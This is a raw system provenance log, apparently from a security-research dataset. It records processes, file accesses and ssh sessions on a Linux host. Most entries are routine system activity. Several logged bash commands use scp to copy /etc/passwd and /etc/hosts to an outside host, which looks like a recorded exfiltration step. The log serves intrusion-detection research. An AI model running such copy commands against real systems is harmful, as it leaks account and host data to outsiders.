1557316846.213:662466625,93B7A74D-CF9D-47E1-3501-ABA48CD598B0:write,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.213:662466622,93B7A74D-CF9D-47E1-3501-ABA48CD598B0:write,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.213:662466485,6F6649D8-DC8E-5840-78DF-F1BED2625588:bash,EXECUTE,93B7A74D-CF9D-47E1-3501-ABA48CD598B0,b'write admin',ta1-trace-2
1557316846.213:662466485,5262E601-C144-0884-0BF3-F0BFAE854E0C:bash,CHANGE_PRINCIPAL,6F6649D8-DC8E-5840-78DF-F1BED2625588,bash,ta1-trace-2
1557316846.213:662466472,AC338181-318A-DF66-E4EF-5A4F1EDF78C9:whoami,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.213:662466399,1E250BF8-0B10-AFDF-E398-52E2F899D749:bash,EXECUTE,AC338181-318A-DF66-E4EF-5A4F1EDF78C9,b'whoami',ta1-trace-2
1557316846.213:662466393,5262E601-C144-0884-0BF3-F0BFAE854E0C:bash,FORK,1E250BF8-0B10-AFDF-E398-52E2F899D749,bash,ta1-trace-2
1557316846.213:662466374,592091AB-0317-618C-A835-83B328AB9CA0:bash,FORK,5262E601-C144-0884-0BF3-F0BFAE854E0C,bash,ta1-trace-2
1557316846.033:662463252,592091AB-0317-618C-A835-83B328AB9CA0:bash,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.033:662463166,6F883D41-F138-33FD-957B-B00FBE869896:sshd,EXECUTE,592091AB-0317-618C-A835-83B328AB9CA0,bash,ta1-trace-2
1557316846.029:662463068,12373D65-1A25-42BF-01AC-02DF89DA8700:sshd,FORK,6F883D41-F138-33FD-957B-B00FBE869896,sshd,ta1-trace-2
1557316846.029:662463022,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.029:662463016,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.029:662462996,6AA7D720-9D9F-1A31-82F4-606933C1391A:sshd,CHANGE_PRINCIPAL,12373D65-1A25-42BF-01AC-02DF89DA8700,sshd,ta1-trace-2
1557316846.029:662462974,9C45D65C-BB7C-3EB9-5B9E-0740E026647B:sshd,CHANGE_PRINCIPAL,6AA7D720-9D9F-1A31-82F4-606933C1391A,sshd,ta1-trace-2
1557316846.029:662462971,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,FORK,9C45D65C-BB7C-3EB9-5B9E-0740E026647B,sshd,ta1-trace-2
1557316846.029:662462962,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.029:662462926,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.029:662462923,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.029:662462920,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316846.025:662462844,F4879936-C7B8-675A-C2E7-9989F077445B:update-motd-fsc,EXECUTE,CBA01622-D49F-A2AE-A760-8BFB291C11D4,cat,ta1-trace-2
1557316846.025:662462842,275B1CF9-59CE-188D-C057-9A0BC5284403:update-motd-fsc,FORK,F4879936-C7B8-675A-C2E7-9989F077445B,update-motd-fsc,ta1-trace-2
1557316846.025:662462627,05F00EDE-DFC7-2156-42D7-1B431F06FE89:98-fsck-at-rebo,EXECUTE,275B1CF9-59CE-188D-C057-9A0BC5284403,update-motd-fsc,ta1-trace-2
1557316846.021:662462605,5BCDE4E8-5250-C3EF-8BC5-EDFBE64E4D73:run-parts,EXECUTE,05F00EDE-DFC7-2156-42D7-1B431F06FE89,98-fsck-at-rebo,ta1-trace-2
1557316846.021:662462604,CF847AA0-6A70-BABD-C42A-723FD87CA306:run-parts,FORK,5BCDE4E8-5250-C3EF-8BC5-EDFBE64E4D73,run-parts,ta1-trace-2
1557316846.021:662462548,F174AC9B-45B3-E810-E743-69801C9AC97F:update-motd-hwe,EXECUTE,A336DCD7-9391-58F6-4A7E-6303403CB780,cat,ta1-trace-2
1557316846.021:662462545,97020948-1F70-96A0-FBAD-C9665DEC8B36:update-motd-hwe,FORK,F174AC9B-45B3-E810-E743-69801C9AC97F,update-motd-hwe,ta1-trace-2
1557316846.001:662461172,B5460AC2-54F0-65D6-1D7D-83E097E08646:95-hwe-eol,EXECUTE,97020948-1F70-96A0-FBAD-C9665DEC8B36,update-motd-hwe,ta1-trace-2
1557316846.001:662461151,E4EB2083-1A78-0FED-15DF-8EEE3E0385B4:run-parts,EXECUTE,B5460AC2-54F0-65D6-1D7D-83E097E08646,95-hwe-eol,ta1-trace-2
1557316846.001:662461150,CF847AA0-6A70-BABD-C42A-723FD87CA306:run-parts,FORK,E4EB2083-1A78-0FED-15DF-8EEE3E0385B4,run-parts,ta1-trace-2
1557316845.981:662460776,008E187F-20E5-9F50-2906-673B0F177D17:lsb_release,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.969:662460515,0D642052-4D4A-E6D9-C6F3-F008F0BE977C:91-release-upgr,EXECUTE,008E187F-20E5-9F50-2906-673B0F177D17,lsb_release,ta1-trace-2
1557316845.969:662460508,D437AE8D-111C-A50C-8A32-C29EFE393602:91-release-upgr,FORK,0D642052-4D4A-E6D9-C6F3-F008F0BE977C,91-release-upgr,ta1-trace-2
1557316845.969:662460501,AC54CEF3-2EB7-EB5D-F4B2-1281F8F3F648:91-release-upgr,FORK,D437AE8D-111C-A50C-8A32-C29EFE393602,91-release-upgr,ta1-trace-2
1557316845.969:662460479,DD3AED7F-1FE5-57E7-817F-D99ACACD00AF:run-parts,EXECUTE,AC54CEF3-2EB7-EB5D-F4B2-1281F8F3F648,91-release-upgr,ta1-trace-2
1557316845.969:662460478,CF847AA0-6A70-BABD-C42A-723FD87CA306:run-parts,FORK,DD3AED7F-1FE5-57E7-817F-D99ACACD00AF,run-parts,ta1-trace-2
1557316845.969:662460452,F9A12B8A-DC52-32A1-3907-1AE2EABD1CD7:update-motd-upd,EXECUTE,503ADDBC-5D84-DF2F-1D1A-45E22D68574D,cat,ta1-trace-2
1557316845.969:662460450,BEDE989A-76ED-E708-7169-44FB3C436426:update-motd-upd,FORK,F9A12B8A-DC52-32A1-3907-1AE2EABD1CD7,update-motd-upd,ta1-trace-2
1557316845.949:662459399,400906F9-D1C9-8E84-13BF-55B390EC81D6:90-updates-avai,EXECUTE,BEDE989A-76ED-E708-7169-44FB3C436426,update-motd-upd,ta1-trace-2
1557316845.949:662459378,7102DEE6-762D-FF28-58FF-67C05EC72BFF:run-parts,EXECUTE,400906F9-D1C9-8E84-13BF-55B390EC81D6,90-updates-avai,ta1-trace-2
1557316845.949:662459377,CF847AA0-6A70-BABD-C42A-723FD87CA306:run-parts,FORK,7102DEE6-762D-FF28-58FF-67C05EC72BFF,run-parts,ta1-trace-2
1557316845.801:662452108,07255731-AE18-D8A6-D8A1-5750E2A4A6FE:landscape-sysin,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.789:662451691,63C391C8-965E-0983-BB1E-60F3BE97BC96:50-landscape-sy,EXECUTE,07255731-AE18-D8A6-D8A1-5750E2A4A6FE,landscape-sysin,ta1-trace-2
1557316845.789:662451684,800CC00A-4C85-8408-6104-3FD0D02219C3:50-landscape-sy,FORK,63C391C8-965E-0983-BB1E-60F3BE97BC96,50-landscape-sy,ta1-trace-2
1557316845.785:662451424,2969D5D3-E2AE-120B-17C2-C16B92F87090:run-parts,EXECUTE,800CC00A-4C85-8408-6104-3FD0D02219C3,50-landscape-sy,ta1-trace-2
1557316845.785:662451418,CF847AA0-6A70-BABD-C42A-723FD87CA306:run-parts,FORK,2969D5D3-E2AE-120B-17C2-C16B92F87090,run-parts,ta1-trace-2
1557316845.773:662451060,BEF35F56-E78F-FD96-DA94-298271ABD10C:env,EXECUTE,CF847AA0-6A70-BABD-C42A-723FD87CA306,run-parts,ta1-trace-2
1557316845.773:662451012,88108D9E-9880-4921-5F89-ACA0C5F34B23:sh,EXECUTE,BEF35F56-E78F-FD96-DA94-298271ABD10C,env,ta1-trace-2
1557316845.773:662451002,0725FBD4-3994-6A71-4366-99712C5F2FE6:sh,FORK,88108D9E-9880-4921-5F89-ACA0C5F34B23,sh,ta1-trace-2
1557316845.773:662450945,EFD5B92A-BC22-36AC-05AD-679CD200DE49:sshd,EXECUTE,0725FBD4-3994-6A71-4366-99712C5F2FE6,sh,ta1-trace-2
1557316845.773:662450919,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,FORK,EFD5B92A-BC22-36AC-05AD-679CD200DE49,sshd,ta1-trace-2
1557316845.773:662450900,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.745:662450515,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.745:662450464,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.745:662450452,438901D8-BE7B-8D0F-553B-55E92BB3DCEF:sshd,CHANGE_PRINCIPAL,6F075139-89D3-8C1A-2DD5-60FE01343C4C,sshd,ta1-trace-2
1557316845.745:662450451,777F8CEE-BC64-6633-43DB-F07ED05728DC:sshd,CHANGE_PRINCIPAL,438901D8-BE7B-8D0F-553B-55E92BB3DCEF,sshd,ta1-trace-2
1557316845.745:662450450,438901D8-BE7B-8D0F-553B-55E92BB3DCEF:sshd,CHANGE_PRINCIPAL,777F8CEE-BC64-6633-43DB-F07ED05728DC,sshd,ta1-trace-2
1557316845.745:662450449,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,CHANGE_PRINCIPAL,438901D8-BE7B-8D0F-553B-55E92BB3DCEF,sshd,ta1-trace-2
1557316845.745:662450447,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.745:662450433,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.741:662450393,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557316845.741:662450390,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.733:662450346,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557316845.733:662450343,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.629:662449967,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.629:662449935,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557316845.629:662449934,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557316845.533:662449567,6F075139-89D3-8C1A-2DD5-60FE01343C4C:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316845.525:662449311,275C3CD9-913E-37DE-D909-AA9463A71DDB:sshd,EXECUTE,6F075139-89D3-8C1A-2DD5-60FE01343C4C,sshd,ta1-trace-2
1557316845.525:662449290,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,275C3CD9-913E-37DE-D909-AA9463A71DDB,sshd,ta1-trace-2
1557316775.392:662315952,77C1080A-59AA-8C4A-E6DB-F9D19E0E5423:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316775.392:662315882,77C1080A-59AA-8C4A-E6DB-F9D19E0E5423:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316775.392:662315806,8B2897A8-E297-185A-EE51-9B17AD2D86A5:sshd,CHANGE_PRINCIPAL,77C1080A-59AA-8C4A-E6DB-F9D19E0E5423,sshd,ta1-trace-2
1557316775.392:662315805,8B2897A8-E297-185A-EE51-9B17AD2D86A5:sshd,CHANGE_PRINCIPAL,8B2897A8-E297-185A-EE51-9B17AD2D86A5,sshd,ta1-trace-2
1557316775.392:662315804,77C1080A-59AA-8C4A-E6DB-F9D19E0E5423:sshd,CHANGE_PRINCIPAL,8B2897A8-E297-185A-EE51-9B17AD2D86A5,sshd,ta1-trace-2
1557316772.264:662309177,CBD37828-39E0-713E-1A9E-ED692C2B2850:scp,READ,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.352:662307552,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.352:662307549,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.352:662307546,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.352:662307543,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.352:662307540,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.352:662307537,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.352:662307534,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.348:662307512,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.344:662307417,67FAD66E-AD52-B7A0-B109-A45427353878:scp,EXECUTE,251D7009-E192-2EC5-6BDA-B2FB19C6A4DF,ssh,ta1-trace-2
1557316771.344:662307408,CBD37828-39E0-713E-1A9E-ED692C2B2850:scp,FORK,67FAD66E-AD52-B7A0-B109-A45427353878,scp,ta1-trace-2
1557316771.344:662307401,CBD37828-39E0-713E-1A9E-ED692C2B2850:scp,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316771.344:662307340,8C4559F1-5983-125D-8510-F0499BFCFE07:bash,EXECUTE,CBD37828-39E0-713E-1A9E-ED692C2B2850,b'scp -r /etc/passwd admin@128.55.12.56:.',ta1-trace-2
1557316771.344:662307333,7A2A8109-0CB7-61B4-6231-AAE02055E7F5:bash,FORK,8C4559F1-5983-125D-8510-F0499BFCFE07,bash,ta1-trace-2
1557316770.412:662300824,C5AE2EC6-BF3C-BEF3-079D-555CD056533E:sh,EXECUTE,32A78D31-5E5F-5F04-78B1-E914120847C9,run-parts,ta1-trace-2
1557316770.412:662300823,C7C5F43D-42AB-430D-30F0-13E4F189609A:sh,FORK,C5AE2EC6-BF3C-BEF3-079D-555CD056533E,sh,ta1-trace-2
1557316770.412:662300807,B90C41F0-DE07-41C1-CDC4-2208712616B4:anacron,EXECUTE,C7C5F43D-42AB-430D-30F0-13E4F189609A,sh,ta1-trace-2
1557316770.412:662300799,809A1B04-6856-1662-BBF8-EA18928B1B79:null,FORK,B90C41F0-DE07-41C1-CDC4-2208712616B4,anacron,ta1-trace-2
1557316770.412:662300787,809A1B04-6856-1662-BBF8-EA18928B1B79:null,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316770.412:662300781,809A1B04-6856-1662-BBF8-EA18928B1B79:null,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316770.412:662300773,809A1B04-6856-1662-BBF8-EA18928B1B79:null,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316770.360:662299587,B3ADEDBB-CFEA-3D6F-3AE8-F7A2276B3B66:cmp,READ,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557316770.360:662299586,B3ADEDBB-CFEA-3D6F-3AE8-F7A2276B3B66:cmp,READ,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557316770.360:662299566,528742AF-9FEB-D39E-410B-CBEB6EB9D216:passwd,EXECUTE,B3ADEDBB-CFEA-3D6F-3AE8-F7A2276B3B66,cmp,ta1-trace-2
1557316770.360:662299564,295E89A4-4294-C3A9-B8C2-1F3BE0F81B2A:passwd,FORK,528742AF-9FEB-D39E-410B-CBEB6EB9D216,passwd,ta1-trace-2
1557316770.360:662299533,618BBB1F-5417-4652-0922-5791CF731DBF:cmp,READ,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316770.360:662299532,618BBB1F-5417-4652-0922-5791CF731DBF:cmp,READ,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316770.360:662299512,BAC76074-B680-84CA-2386-E5236C8FD504:passwd,EXECUTE,618BBB1F-5417-4652-0922-5791CF731DBF,cmp,ta1-trace-2
1557316770.360:662299509,295E89A4-4294-C3A9-B8C2-1F3BE0F81B2A:passwd,FORK,BAC76074-B680-84CA-2386-E5236C8FD504,passwd,ta1-trace-2
1557316770.356:662299488,C5471D0F-91CF-502D-0124-69D12868AFE7:run-parts,EXECUTE,295E89A4-4294-C3A9-B8C2-1F3BE0F81B2A,passwd,ta1-trace-2
1557316770.356:662299479,BF9E5849-ADB3-8985-BCC9-F1FC21DE4F2D:run-parts,FORK,C5471D0F-91CF-502D-0124-69D12868AFE7,run-parts,ta1-trace-2
1557316770.356:662299338,C0431975-1236-7E2B-BF61-6C7BE0C2D395:ntp,EXECUTE,8DD2D9D7-80E4-AAC6-F823-46B4FE7C38F9,cat,ta1-trace-2
1557316770.356:662299320,4993EE47-866F-4298-89B8-673C66369B10:ntp,FORK,C0431975-1236-7E2B-BF61-6C7BE0C2D395,ntp,ta1-trace-2
1557316770.356:662299311,0F59B125-E614-94CA-38DD-976F12023A83:ntp,FORK,4993EE47-866F-4298-89B8-673C66369B10,ntp,ta1-trace-2
1557316770.352:662299289,BB22C719-1679-0665-7555-F7A662B49F70:run-parts,EXECUTE,0F59B125-E614-94CA-38DD-976F12023A83,ntp,ta1-trace-2
1557316770.352:662299280,BF9E5849-ADB3-8985-BCC9-F1FC21DE4F2D:run-parts,FORK,BB22C719-1679-0665-7555-F7A662B49F70,run-parts,ta1-trace-2
1557316767.220:662284703,E2C0D6A2-D579-3A25-6D88-222C95F904FC:scp,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557316766.384:662279346,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.384:662279343,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.384:662279340,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.384:662279337,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.384:662279334,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.384:662279331,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.384:662279328,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.380:662279287,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4:ssh,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.380:662279189,7A55D1DF-846D-63EB-97A5-B5947DC16FEB:scp,EXECUTE,A063B52A-9EAF-2FEE-D51F-3BECBFA277B4,ssh,ta1-trace-2
1557316766.380:662279180,E2C0D6A2-D579-3A25-6D88-222C95F904FC:scp,FORK,7A55D1DF-846D-63EB-97A5-B5947DC16FEB,scp,ta1-trace-2
1557316766.380:662279173,E2C0D6A2-D579-3A25-6D88-222C95F904FC:scp,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.376:662279111,391F3B6D-2DB2-07E6-DB65-E06186BD55C5:bash,EXECUTE,E2C0D6A2-D579-3A25-6D88-222C95F904FC,b'scp -r /etc/hosts admin@128.55.12.56:\\C:WindowsTemp',ta1-trace-2
1557316766.376:662279105,7A2A8109-0CB7-61B4-6231-AAE02055E7F5:bash,FORK,391F3B6D-2DB2-07E6-DB65-E06186BD55C5,bash,ta1-trace-2
1557316766.204:662275804,7A2A8109-0CB7-61B4-6231-AAE02055E7F5:bash,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.204:662275715,BCE51F53-2666-FF24-2096-995F9E6B778A:sshd,EXECUTE,7A2A8109-0CB7-61B4-6231-AAE02055E7F5,bash,ta1-trace-2
1557316766.200:662275601,7A81AF6C-C6F4-302F-03FA-1F19C55BF009:sshd,FORK,BCE51F53-2666-FF24-2096-995F9E6B778A,sshd,ta1-trace-2
1557316766.200:662275555,77C1080A-59AA-8C4A-E6DB-F9D19E0E5423:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.200:662275549,77C1080A-59AA-8C4A-E6DB-F9D19E0E5423:sshd,MMAP,4BC3CEC5-06A4-B0A1-5FF7-1C65DBEFD93E,/etc/passwd,ta1-trace-2
1557316766.200:662275529,72E9C23A-4086-29EB-6A7C-091B7055C465:sshd,CHANGE_PRINCIPAL,7A81AF6C-C6F4-302F-03FA-1F19C55BF009,sshd,ta1-trace-2
1557316766.200:662275507,3A74AF23-951F-C254-9F17-E187E8FA5551:sshd,CHANGE_PRINCIPAL,72E9C23A-4086-29EB-6A7C-091B7055C465,sshd,ta1-trace-2
1557316766.200:662275504,77C1080A-59AA-8C4A-E6DB-F9D19E0E5423:sshd,FORK,3A74AF23-951F-C254-9F17-E187E8FA5551,sshd,ta1-trace-2
